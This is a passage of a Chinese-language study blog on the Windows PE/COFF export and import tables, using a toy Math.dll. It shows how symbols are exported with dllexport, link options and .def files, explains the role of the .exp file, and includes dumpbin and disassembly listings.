<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddressOfNames[<span class="number">0</span>]=<span class="string">&quot;Add&quot;</span>;</span><br><span class="line">AddressOfNames[<span class="number">1</span>]=<span class="string">&quot;Mul&quot;</span>;</span><br><span class="line">AddressOfNames[<span class="number">2</span>]=<span class="string">&quot;Sub&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>到此完美解决了历史问题,即函数只有序号没有名字这个问题</p>
<p>下面考虑新增的函数怎么安排</p>
<p>假设要增加一个"Div"函数,这个字符串的字典序在"Add"和"Mul"之间.</p>
<p>因此安排上它之后AddressOfNames这个符号名表应该是</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220815171746124.png"
alt="image-20220815171746124" />
<figcaption aria-hidden="true">image-20220815171746124</figcaption>
</figure>
<p>原来查这个表中的Mul得到的下标是1,现在Div把它往后挤了一个位置,再查Mul得到的下标成2了,显然不能再拿着2去查原来的符号序号对照表了,因为原来的符号序号对照表的第2个是Sub的序号</p>
<p>这时候应该咋办呢?</p>
<p>新函数Div插入了AddressOfNames[1],那么原来的AddressOfNames[1]之后的各项顺延一个,AddressOfOrdinals数组中对应项也跟着顺延</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for(int i=length(AddressOfNames);i&gt;1;--i)&#123;</span><br><span class="line">	AddressOfNames[i]=AddressOfNames[i-1];</span><br><span class="line">	AddressOfOrdinals[i]=AddressOfOrdinals[i-1];</span><br><span class="line">&#125;</span><br><span class="line">AddressOfNames[1]=&quot;Div&quot;;</span><br><span class="line">AddressOfOrdinals[1]=4</span><br></pre></td></tr></table></figure>
<p>这样查在AddressOfNames[i]中查Mul得到2,用2查AddressOfOrdinals[2]-base得到的还是原来的AddressOfFunctions中的下标.这就对应上了</p>
<p>还有一个问题没有解决,
新的函数怎么编号,新的函数放到地址导出表的那里?</p>
<p>地址导出表中的位置取决于编号,编号-base就是地址导出表中的下标,因此只需要确定编号</p>
<p>原来的编号已经有1,2,3了,那么4及之后的编号都可是使用,那么新函数Div可以获取任意一个大于等于4的编号.</p>
<p>假如给他的编号是4,那么4-base=4-1=3,那么导出地址表的AddressOfFunctions[3]就得是Div的相对虚拟地址</p>
<p>假如给他的编号是5,那么5-base=5-1=4,那么导出地址表的AddressOfFunctions[4]就得是Div的相对虚拟地址</p>
<p>...以此类推</p>
<p>如果给他的编号是5,那么4没有被使用,并且AddressOfFunctions[3]没有被使用,这合理吗?合理,由于编号4未使用,只要是日后再有新函数加进来,就可以给他分一个编号4,其相对虚拟地址就放在AddressOfFunctions[3].不流失不蒸发零浪费</p>
<p>书上这里就给了Div编号为5的情况</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220815172959162.png"
alt="image-20220815172959162" />
<figcaption aria-hidden="true">image-20220815172959162</figcaption>
</figure>
<h3 id="指定导出符号">指定导出符号</h3>
<p>指定导出符号有多种方法,比如<code>__declspec(dllexport)</code>编译器拓展修饰符或者def链接脚本,或者link命令行上直接指定</p>
<h4 id="declspecdllexport-1">__declspec(dllexport)</h4>
<p>此种方法编译器会,在只编译不链接形成的,obj文件中的.drectve段中,加入链接指示(实际上就是命令行参数)</p>
<p>链接器处理obj文件时会把.drectve中的信息提取出来放到命令行上当作链接命令</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\desktop\math&gt; cl /c Math.c</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SECTION HEADER <span class="comment">#1</span></span><br><span class="line">.drectve name</span><br><span class="line">       0 physical address</span><br><span class="line">       0 virtual address</span><br><span class="line">      53 size of raw data</span><br><span class="line">      B4 file pointer to raw data (000000B4 to 00000106)</span><br><span class="line">       0 file pointer to relocation table</span><br><span class="line">       0 file pointer to line numbers</span><br><span class="line">       0 number of relocations</span><br><span class="line">       0 number of line numbers</span><br><span class="line">  100A00 flags</span><br><span class="line">         Info</span><br><span class="line">         Remove</span><br><span class="line">         1 byte align</span><br><span class="line"></span><br><span class="line">RAW DATA <span class="comment">#1</span></span><br><span class="line">  00000000: 20 20 20 2F 44 45 46 41 55 4C 54 4C 49 42 3A 22     /DEFAULTLIB:<span class="string">&quot;</span></span><br><span class="line"><span class="string">  00000010: 4C 49 42 43 4D 54 22 20 2F 44 45 46 41 55 4C 54  LIBCMT&quot;</span> /DEFAULT</span><br><span class="line">  00000020: 4C 49 42 3A 22 4F 4C 44 4E 41 4D 45 53 22 20 2F  LIB:<span class="string">&quot;OLDNAMES&quot;</span> /</span><br><span class="line">  00000030: 45 58 50 4F 52 54 3A 41 64 64 20 2F 45 58 50 4F  EXPORT:Add /EXPO</span><br><span class="line">  00000040: 52 54 3A 53 75 62 20 2F 45 58 50 4F 52 54 3A 4D  RT:Sub /EXPORT:M</span><br><span class="line">  00000050: 75 6C 20                                         ul</span><br><span class="line"></span><br><span class="line">   Linker Directives</span><br><span class="line">   -----------------</span><br><span class="line">   /DEFAULTLIB:LIBCMT</span><br><span class="line">   /DEFAULTLIB:OLDNAMES</span><br><span class="line">   /EXPORT:Add</span><br><span class="line">   /EXPORT:Sub</span><br><span class="line">   /EXPORT:Mul</span><br></pre></td></tr></table></figure>
<p>因此这里使用编译器拓展修饰符的作用就<strong>相当于不写拓展修饰,但是使用link命令行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cl /c Math.c</span><br><span class="line">link /dll Math.obj /EXPORT:Add /EXPORT:Sub /EXPORT:Mul /DEFAULTLIB:LIBCMT /DEFAULTLIB:OLDNAMES</span><br></pre></td></tr></table></figure>
<p>后面这个<code>/DEFAULTLIB:</code>不写也可以,默认自带.LIBCMT全称Library
C multithreaded,及VC的多线程C库</p>
<h4 id="link命令行">link命令行</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cl /c Math.c</span><br><span class="line">link /dll Math.obj /EXPORT:Add /EXPORT:Sub /EXPORT:Mul</span><br></pre></td></tr></table></figure>
<p>/EXPORT:<函数名>指定这个函数为导出函数</p>
<h4 id="def链接脚本">.def链接脚本</h4>
<p><code>Math.def</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LIBRARY MATH</span><br><span class="line">EXPORTS</span><br><span class="line">Add</span><br><span class="line">Sub</span><br><span class="line">Mul</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cl Math.c /LD /DEF Math.def</span><br></pre></td></tr></table></figure>
<h4 id="def链接脚本指定符号序号">def链接脚本指定符号序号</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LIBRARY Math</span><br><span class="line">EXPORTS</span><br><span class="line">Add@1</span><br><span class="line">Sub@2</span><br><span class="line">Mul@3</span><br><span class="line">Div @4 NONAME   </span><br></pre></td></tr></table></figure>
<p>NONAME意思是匿名导出函数,只有序号没有名字</p>
<h2 id="exp文件">exp文件</h2>
<p>创建Math.dll是总会跟着生成一个Math.lib和一个Math.exp.</p>
<p>其中Math.lib是导入库.</p>
<p>Math.exp只是一个中间过程产物,没有作用,即使删了也不影响Math.lib和TestMath.obj的链接.</p>
<p>那这个玩意儿是干啥用的呢?</p>
<p>链接器创建DLL文件时会进行两遍扫描.</p>
<p>第一遍扫描会遍历所有的目标文件,收集所有导出符号以创建DLL导出表,</p>
<p>这第一遍扫描只是为了建立一个导出表,为了方便就直接创建了一个exp文件存放这个导出表.这个exp文件也是一个标准PE/COFF文件</p>
<p>第二次扫描的时候该exp文件就和其他目标文件一样链接进入DLL.由于该exp文件中只有导出表,只读属性,因此exp文件的内容会合并到DLL的.rdata只读数据段</p>
<p>dll文件的导出表结构基本上是从exp照搬过来的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220815223152579.png"
alt="左exp右dll导出表" />
<figcaption aria-hidden="true">左exp右dll导出表</figcaption>
</figure>
<p>exp文件的整个.edata区就只有一个导出表还有它指向的三个数组的信息</p>
<h4 id="exp.edata">exp.edata</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.edata:<span class="number">0000000000000000</span> _edata          segment para public <span class="string">&#x27;DATA&#x27;</span> use64</span><br><span class="line">.edata:<span class="number">0000000000000000</span>                 assume cs:_edata</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//0x0到0x27是IMAGE_EXPORT_DIRECTORY结构体</span></span><br><span class="line">.edata:<span class="number">0000000000000000</span>                 dd <span class="number">0</span></span><br><span class="line">.edata:<span class="number">0000000000000004</span>                 dd <span class="number">0F</span>FFFFFFFh</span><br><span class="line">.edata:<span class="number">0000000000000008</span>                 dw <span class="number">0</span></span><br><span class="line">.edata:<span class="number">000000000000000</span>A                 dw <span class="number">0</span></span><br><span class="line">.edata:<span class="number">000000000000000</span>C                 dd offset szName        ; <span class="string">&quot;Math.dll&quot;</span>	;<span class="number">0x46</span></span><br><span class="line">.edata:<span class="number">0000000000000010</span>                 dd <span class="number">1</span></span><br><span class="line">.edata:<span class="number">0000000000000014</span>                 dd <span class="number">3</span></span><br><span class="line">.edata:<span class="number">0000000000000018</span>                 dd <span class="number">3</span></span><br><span class="line">.edata:<span class="number">000000000000001</span>C                 dd offset rgpv	;<span class="number">0x28</span></span><br><span class="line">.edata:<span class="number">0000000000000020</span>                 dd offset rgszName	;<span class="number">0x34</span></span><br><span class="line">.edata:<span class="number">0000000000000024</span>                 dd offset rgwOrd	;<span class="number">0x40</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">.edata:<span class="number">0000000000000028</span> rgpv            dd offset Add           ; DATA XREF: .edata:<span class="number">000000000000001</span>C↑o</span><br><span class="line">.edata:<span class="number">000000000000002</span>C                 dd offset Mul</span><br><span class="line">.edata:<span class="number">0000000000000030</span>                 dd offset Sub</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">.edata:<span class="number">0000000000000034</span> rgszName        dd offset $N00001       ; DATA XREF: .edata:<span class="number">0000000000000020</span>↑o</span><br><span class="line">.edata:<span class="number">0000000000000034</span>                                         ; <span class="string">&quot;Add&quot;</span></span><br><span class="line">.edata:<span class="number">0000000000000038</span>                 dd offset $N00002       ; <span class="string">&quot;Mul&quot;</span></span><br><span class="line">.edata:<span class="number">000000000000003</span>C                 dd offset $N00003       ; <span class="string">&quot;Sub&quot;</span></span><br><span class="line">    </span><br><span class="line">.edata:<span class="number">0000000000000040</span> rgwOrd          dw <span class="number">0</span>                    ; DATA XREF: .edata:<span class="number">0000000000000024</span>↑o</span><br><span class="line">.edata:<span class="number">0000000000000042</span>                 dw <span class="number">1</span></span><br><span class="line">.edata:<span class="number">0000000000000044</span>                 dw <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">.edata:<span class="number">0000000000000046</span> ; TCHAR szName[<span class="number">40</span>]</span><br><span class="line">.edata:<span class="number">0000000000000046</span> szName          db <span class="string">&#x27;Math.dll&#x27;</span>,<span class="number">0</span>         ; DATA XREF: .edata:<span class="number">000000000000000</span>C↑o</span><br><span class="line">.edata:<span class="number">000000000000004F</span> $N00001         db <span class="string">&#x27;Add&#x27;</span>,<span class="number">0</span>   ;<span class="number">4f</span>h           ; DATA XREF: .edata:rgszName↑o</span><br><span class="line">.edata:<span class="number">0000000000000053</span> $N00002         db <span class="string">&#x27;Mul&#x27;</span>,<span class="number">0</span>   ;           ; DATA XREF: .edata:<span class="number">0000000000000038</span>↑o</span><br><span class="line">.edata:<span class="number">0000000000000057</span> $N00003         db <span class="string">&#x27;Sub&#x27;</span>,<span class="number">0</span>              ; DATA XREF: .edata:<span class="number">000000000000003</span>C↑o</span><br><span class="line">.edata:<span class="number">0000000000000057</span> _edata          ends</span><br></pre></td></tr></table></figure>
<h5 id="x58edata段">[0,0x58)edata段</h5>
<p>edata段的文件偏移为0,到0x57字节结束,一共0x58个字节,其中</p>
<h5 id="x28-image_export_directory">[0,0x28) IMAGE_EXPORT_DIRECTORY</h5>
<p>0到0x27共40个字节是IMAGE_EXPORT_DIRECTORY结构体,也就是DataDirectory[0].VirtualAddress指向的结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">  DWORD Characteristics;</span><br><span class="line">  DWORD TimeDateStamp;</span><br><span class="line">  WORD MajorVersion;</span><br><span class="line">  WORD MinorVersion;</span><br><span class="line">  DWORD Name;</span><br><span class="line">  DWORD Base;</span><br><span class="line">  DWORD NumberOfFunctions;</span><br><span class="line">  DWORD NumberOfNames;</span><br><span class="line">  DWORD AddressOfFunctions;</span><br><span class="line">  DWORD AddressOfNames;</span><br><span class="line">  DWORD AddressOfNameOrdinals;</span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure>
<h5 id="x280x34-导出地址表">[0x28,0x34) 导出地址表</h5>
<p>0x28到0x33这12个字节是IMAGE_EXPORT_DIRECTORY.AddressOfFunctions指向的地址导出表EAT</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddressOfFunctions[0]=0x60</span><br><span class="line">AddressOfFunctions[1]=0x68</span><br><span class="line">AddressOfFunctions[2]=0x70</span><br></pre></td></tr></table></figure>
<p>这里0x60,0x68,0x70指向的是.edata段之后的UNDEF部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">UNDEF:<span class="number">0000000000000060</span> ; Segment type: Externs</span><br><span class="line">UNDEF:<span class="number">0000000000000060</span> ; UNDEF</span><br><span class="line">UNDEF:<span class="number">0000000000000060</span>                 extrn Add:near          ; DATA XREF: .edata:rgpv↑o</span><br><span class="line">UNDEF:<span class="number">0000000000000068</span>                 extrn Mul:near          ; DATA XREF: .edata:<span class="number">000000000000002</span>C↑o</span><br><span class="line">UNDEF:<span class="number">0000000000000070</span>                 extrn Sub:near          ; DATA XREF: .edata:<span class="number">0000000000000030</span>↑o</span><br></pre></td></tr></table></figure>
<p>每一项8个字节,是64位机器上一个指针的长度,看来应该是存放一个函数地址的地方.</p>
<p>显然这里是一个桩代码,因为exp文件不含这三个函数的定义,因此需要等到进入dll后才能确定三个函数的位置</p>
<h5 id="x340x40-函数名表">[0x34,0x40) 函数名表</h5>
<p>0x34到0x3F这12个字节是IMAGE_EXPORT_DIRECTORY.AddressOfNames指向的函数名表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_EXPORT_DIRECTORY.AddressOfNames[0]=0x4F</span><br><span class="line">IMAGE_EXPORT_DIRECTORY.AddressOfNames[0]=0x53</span><br><span class="line">IMAGE_EXPORT_DIRECTORY.AddressOfNames[0]=0x57</span><br></pre></td></tr></table></figure>
<p>而0x4F开始正好是三个函数名</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.edata:<span class="number">000000000000004F</span> $N00001         db <span class="string">&#x27;Add&#x27;</span>,<span class="number">0</span>              ; DATA XREF: .edata:rgszName↑o</span><br><span class="line">.edata:<span class="number">0000000000000053</span> $N00002         db <span class="string">&#x27;Mul&#x27;</span>,<span class="number">0</span>              ; DATA XREF: .edata:<span class="number">0000000000000038</span>↑o</span><br><span class="line">.edata:<span class="number">0000000000000057</span> $N00003         db <span class="string">&#x27;Sub&#x27;</span>,<span class="number">0</span>              ; DATA XREF: .edata:<span class="number">000000000000003</span>C↑o</span><br></pre></td></tr></table></figure>
<h5 id="x400x46-符号序号对应表">[0x40,0x46) 符号序号对应表</h5>
<p>0x40到0x45这6个字节是IMAGE_EXPORT_DIRECTORY.AddressOfOrdinals指向的符号序号对照表</p>
<p>这个表的表项是字类型的序号整数值,因此三个表项占用三个字,六个字节</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_EXPORT_DIRECTORY.AddressOfOrdinals[0]=0</span><br><span class="line">IMAGE_EXPORT_DIRECTORY.AddressOfOrdinals[1]=1</span><br><span class="line">IMAGE_EXPORT_DIRECTORY.AddressOfOrdinals[1]=1</span><br></pre></td></tr></table></figure>
<h5 id="x460x58-字符串表">[0x46,0x58) 字符串表</h5>
<p>最后一段,用来存放字符串表,包括dll名,三个函数名</p>
<h4 id="dll.rdata.导出表">dll.rdata.导出表</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">.rdata:<span class="number">0000000180017</span>DE0 ; Export directory <span class="keyword">for</span> Math.dll</span><br><span class="line">.rdata:<span class="number">0000000180017</span>DE0 ;</span><br><span class="line">.rdata:<span class="number">0000000180017</span>DE0                 dd <span class="number">0</span>                    ; Characteristics</span><br><span class="line">.rdata:<span class="number">0000000180017</span>DE4                 dd <span class="number">0F</span>FFFFFFFh           ; TimeDateStamp</span><br><span class="line">.rdata:<span class="number">0000000180017</span>DE8                 dw <span class="number">0</span>                    ; MajorVersion</span><br><span class="line">.rdata:<span class="number">0000000180017</span>DEA                 dw <span class="number">0</span>                    ; MinorVersion</span><br><span class="line">.rdata:<span class="number">0000000180017</span>DEC                 dd rva aMathDll         ; Name</span><br><span class="line">.rdata:<span class="number">0000000180017</span>DF0                 dd <span class="number">1</span>                    ; Base</span><br><span class="line">.rdata:<span class="number">0000000180017</span>DF4                 dd <span class="number">3</span>                    ; NumberOfFunctions</span><br><span class="line">.rdata:<span class="number">0000000180017</span>DF8                 dd <span class="number">3</span>                    ; NumberOfNames</span><br><span class="line">.rdata:<span class="number">0000000180017</span>DFC                 dd rva off_180017E08    ; AddressOfFunctions</span><br><span class="line">.rdata:<span class="number">0000000180017E00</span>                 dd rva off_180017E14    ; AddressOfNames</span><br><span class="line">.rdata:<span class="number">0000000180017E04</span>                 dd rva word_180017E20   ; AddressOfNameOrdinals</span><br><span class="line">.rdata:<span class="number">0000000180017E08</span> ;</span><br><span class="line">.rdata:<span class="number">0000000180017E08</span> ; Export Address Table <span class="keyword">for</span> Math.dll</span><br><span class="line">.rdata:<span class="number">0000000180017E08</span> ;</span><br><span class="line">.rdata:<span class="number">0000000180017E08</span> off_180017E08   dd rva Add, rva Mul, rva Sub</span><br><span class="line">.rdata:<span class="number">0000000180017E08</span>                                         ; DATA XREF: .rdata:<span class="number">0000000180017</span>DFC↑o</span><br><span class="line">.rdata:<span class="number">0000000180017E14</span> ;</span><br><span class="line">.rdata:<span class="number">0000000180017E14</span> ; Export Names Table <span class="keyword">for</span> Math.dll</span><br><span class="line">.rdata:<span class="number">0000000180017E14</span> ;</span><br><span class="line">.rdata:<span class="number">0000000180017E14</span> off_180017E14   dd rva aAdd, rva aMul, rva aSub</span><br><span class="line">.rdata:<span class="number">0000000180017E14</span>                                         ; DATA XREF: .rdata:<span class="number">0000000180017E00</span>↑o</span><br><span class="line">.rdata:<span class="number">0000000180017E14</span>                                         ; <span class="string">&quot;Add&quot;</span> ...</span><br><span class="line">.rdata:<span class="number">0000000180017E20</span> ;</span><br><span class="line">.rdata:<span class="number">0000000180017E20</span> ; Export Ordinals Table <span class="keyword">for</span> Math.dll</span><br><span class="line">.rdata:<span class="number">0000000180017E20</span> ;</span><br><span class="line">.rdata:<span class="number">0000000180017E20</span> word_180017E20  dw <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>              ; DATA XREF: .rdata:<span class="number">0000000180017E04</span>↑o</span><br><span class="line">.rdata:<span class="number">0000000180017E26</span> aMathDll        db <span class="string">&#x27;Math.dll&#x27;</span>,<span class="number">0</span>         ; DATA XREF: .rdata:<span class="number">0000000180017</span>DEC↑o</span><br><span class="line">.rdata:<span class="number">0000000180017E2</span>F aAdd            db <span class="string">&#x27;Add&#x27;</span>,<span class="number">0</span>              ; DATA XREF: .rdata:off_180017E14↑o</span><br><span class="line">.rdata:<span class="number">0000000180017E33</span> aMul            db <span class="string">&#x27;Mul&#x27;</span>,<span class="number">0</span>              ; DATA XREF: .rdata:off_180017E14↑o</span><br><span class="line">.rdata:<span class="number">0000000180017E37</span> aSub            db <span class="string">&#x27;Sub&#x27;</span>,<span class="number">0</span>              ; DATA XREF: .rdata:off_180017E14↑o</span><br></pre></td></tr></table></figure>
<h5 id="x180017de00x180017e38">[0x180017DE0,0x180017E38)</h5>
<p>共58个字节,正好和exp.edata段对应,甚至每个字节意义都对应</p>
<table>
<colgroup>
<col style="width: 43%" />
<col style="width: 17%" />
<col style="width: 39%" />
</colgroup>
<thead>
<tr>
<th>成分</th>
<th>exp.edata</th>
<th>dll.idata.导出表</th>
</tr>
</thead>
<tbody>
<tr>
<td>IMAGE_EXPORT_DIRECTORY结构体</td>
<td>[0,0x28)</td>
<td>[0x180017DE0,0x180017E08)</td>
</tr>
<tr>
<td>导出地址表</td>
<td>[0x28,0x34)</td>
<td>[0x180017E08,0x180017E14)</td>
</tr>
<tr>
<td>函数名表</td>
<td>[0x34,0x40)</td>
<td>[0x180017E14,0x180017E20)</td>
</tr>
<tr>
<td>符号序号对应表</td>
<td>[0x40,0x46)</td>
<td>[0x180017E20,0x180017E26)</td>
</tr>
<tr>
<td>字符串表</td>
<td>[0x46,0x58)</td>
<td>[0x180017E26,0x180017E38)</td>
</tr>
</tbody>
</table>
<p>相当于把exp.edata段照搬到dll的0x180017DE0处,然后修改了到处地址表指向的函数地址.显然这个事应该是运行时动态链接器干的.</p>
<p>类似于GOT和PLT的机制</p>
<h2 id="导入表">导入表</h2>
<p>使用dumpbin观察Math.dll的导入表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\desktop\Math&gt; dumpbin /IMPORTS Math.dll</span><br><span class="line"><span class="title function_">Microsoft</span> <span class="params">(R)</span> COFF/PE Dumper Version 14.31.31106.2</span><br><span class="line"><span class="title function_">Copyright</span> <span class="params">(C)</span> Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Dump of file Math.dll</span><br><span class="line"></span><br><span class="line">File Type: DLL</span><br><span class="line"></span><br><span class="line">  Section contains the following imports:</span><br><span class="line"></span><br><span class="line">    KERNEL32.dll</span><br><span class="line">             18000F000 Import Address Table</span><br><span class="line">             180017E68 Import Name Table</span><br><span class="line">                     0 time date stamp</span><br><span class="line">                     0 Index of first forwarder reference</span><br><span class="line"></span><br><span class="line">                         470 QueryPerformanceCounter</span><br><span class="line">                         233 GetCurrentProcessId</span><br><span class="line">                         237 GetCurrentThreadId</span><br><span class="line">							...</span><br><span class="line">                          DA CreateFileW</span><br><span class="line">                          94 CloseHandle</span><br></pre></td></tr></table></figure>
<p>Math.dll自己偷着导入了kernel32.dll等库中的函数,然而我们并没有显式调用这些函数,也没有在链接的时候指定要链接kernel32.lib导入库.</p>
<p>这是因为kernel32包含的C基本运行库是自动链接的</p>
<p>装载器会尽量少导入函数但是保证满足所有依赖.</p>
<h3 id="datadirectory1">DataDirectory[1]</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PE头-&gt;</span><br><span class="line">	NT头-&gt;</span><br><span class="line">		NT可选头-&gt;</span><br><span class="line">			DataDirectory[<span class="number">1</span>]-&gt;</span><br><span class="line">				IMAGE_IMPORT_DESCRIPTOR[]-&gt;</span><br><span class="line">    				FirstThunk-&gt;IMAGE_IMPORT_BY_NAME</span><br><span class="line">    					</span><br><span class="line">    				</span><br></pre></td></tr></table></figure>
<p>PE/COFF文件的NT可选头的DataDirectory[1]就是导入表的数据目录</p>
<p><code>DataDirectory[1].VirtualAddress</code>指向的是一个IMAGE_IMPORT_DESCRIPTOR[]结构体数组,该结构体数组以一个全空的结构体元素结尾</p>
<p><code>DataDirectory[1].Size</code>表明该结构体数组的总大小</p>
<p>因此可以得到这样的公式 <span class="math display">\[
\frac{DataDirectory[1].Size}{sizeof(IMAGE\_IMPORT\_DESCRIPTOR)}-1=有意义的导入描述符个数
\]</span></p>
<h3 id="image_import_descriptor">IMAGE_IMPORT_DESCRIPTOR</h3>
<p>每一个需要导入的<strong>库</strong>都会对应一个IMAGE_IMPORT_DESCRIPTOR导入描述符</p>
<p>DataDirectory[1].VirtualAddress[0]就是kernel32.dll的导入描述符结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">     __C89_NAMELESS <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">DWORD Characteristics;</span><br><span class="line">DWORD OriginalFirstThunk;<span class="comment">//导入名称表INT,import name table</span></span><br><span class="line">     &#125; DUMMYUNIONNAME;</span><br><span class="line">     DWORD TimeDateStamp;</span><br><span class="line"></span><br><span class="line">     DWORD ForwarderChain;</span><br><span class="line">     DWORD Name;	<span 